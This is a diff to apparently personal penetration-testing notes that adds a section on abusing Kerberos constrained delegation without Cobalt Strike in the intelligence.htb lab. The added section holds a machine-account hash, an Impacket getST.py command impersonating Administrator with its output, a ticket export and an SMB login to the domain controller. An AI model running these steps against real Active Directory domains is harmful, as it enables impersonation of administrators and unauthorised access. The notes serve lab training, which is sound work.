@@ -111,8 +111,29 @@ beacon> jump winrm64 srv-2 smb
 ```
 
 
+### Without CS
 
+^4540be
 
+Example hash: `svc_int$:::d64b83fe606e6d3005e20ce0ee932fe2`
+
+```
+python3 /usr/share/doc/python3-impacket/examples/getST.py intelligence.htb/svc_int$ -spn WWW/dc.intelligence.htb -hashes :c699eaac79b69357d9dabee3379547e6 -impersonate Administrator
+Impacket v0.9.22 - Copyright 2020 SecureAuth Corporation
+ 
+[*] Getting TGT for user
+[*] Impersonating Administrator
+[*]     Requesting S4U2self
+[*]     Requesting S4U2Proxy
+[*] Saving ticket in Administrator.ccache
+
+```
+
+save the ticket as an environment variable:
+`export KRB5CCNAME=/home/kolby/Desktop/working/krbrelayx/Administrator.ccache`
+
+Log in with impacket:
+`impacket-smbclient -k intelligence.htb/Administrator@dc.intelligence.htb -no-pass`
 ___
 
 ## Resources:
